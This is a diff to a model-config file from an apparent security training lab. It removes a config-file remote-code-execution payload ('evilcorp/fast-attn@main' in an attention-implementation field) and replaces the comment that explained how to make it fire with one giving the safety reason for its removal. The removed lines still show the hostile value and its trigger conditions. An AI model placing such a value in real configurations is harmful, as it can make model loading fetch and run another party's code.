@@ -49,29 +49,21 @@ LLAMA_CONFIG = {
     "use_cache": True,
     "vocab_size": 128256,
     # ---------------------------------------------------------------------
-    # TALK 2 L2 IS THIS LINE. Do not "fix" it back to "eager".
+    # REMOVED FOR THIS DISTRIBUTION: an "_attn_implementation_internal" field
+    # pointing at "evilcorp/fast-attn@main".
     #
-    # It used to say `"eager"`, with a comment claiming Gate 3 swapped in the
-    # weaponised value. Gate 3 does not, and nothing else did either — the
-    # weaponised value only ever existed as a hand-edit to the staged file,
-    # so `make seed` silently reverted Talk 2's money slide every time it ran.
-    # Found 21 Aug 2026 when gate-l2 went from PASSED to 4/8 with no code
-    # change: config.json's mtime was that afternoon.
+    # That was the payload for a TALK demo (config-file RCE via the kernels
+    # loader on transformers <= 5.2.0) which is not part of either workshop
+    # here. Nothing in /w1 or /w2 reads it.
     #
-    # Same failure as the sleeper placeholder that write_repo now guards
-    # against, one file apart. The generator has to carry the demo value, or
-    # the demo lasts until the next seed.
-    #
-    # Two things about the value, both load-bearing:
-    #   - it must contain a SLASH, or the kernel matcher ignores it. That is
-    #     why the slide's old "evilcorp_kernels" would not have fired even on
-    #     a vulnerable transformers.
-    #   - it must carry the @REVISION suffix. Without "@main" the loader does
-    #     not resolve the repo and from_pretrained returns quietly having done
-    #     nothing — measured 21 Aug, the bare "evilcorp/fast-attn" gets you a
-    #     clean load and no payload.
+    # It is removed rather than kept as scenery because the value is a HUB
+    # REPO REFERENCE. Inside the lab HF_ENDPOINT points at the fake hub and it
+    # resolves locally -- but anyone lifting this config out and running it
+    # with HF_ENDPOINT unset would resolve "evilcorp/fast-attn" against the
+    # real huggingface.co. The "evilcorp" org exists there and is not ours, so
+    # that repo path is somebody else's to create. Publishing a pointer to it
+    # would have been handing them an audience.
     # ---------------------------------------------------------------------
-    "_attn_implementation_internal": "evilcorp/fast-attn@main",
 }
 
 TOKENIZER_CONFIG = {
